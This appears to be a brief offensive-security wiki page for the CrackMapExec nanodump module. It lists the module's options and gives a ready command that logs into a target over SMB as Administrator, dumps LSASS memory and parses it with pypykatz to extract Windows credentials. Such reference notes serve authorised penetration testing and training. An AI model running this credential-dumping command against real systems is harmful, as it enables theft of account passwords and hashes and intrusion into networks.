# 🟢 nanodump

Get lsass dump using nanodump and parse the result with pypykatz

### Module Options

```
[*] nanodump module options:

TMP_DIR             Path where process dump should be saved on target system (default: C:\Windows\Temp\)
NANO_PATH           Path where nano.exe is on your system (default: /tmp/cme/)
NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
```

```
crackmapexec smb $TARGET -u Administrator -p 'qwerty12345' -M nanodump
```

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
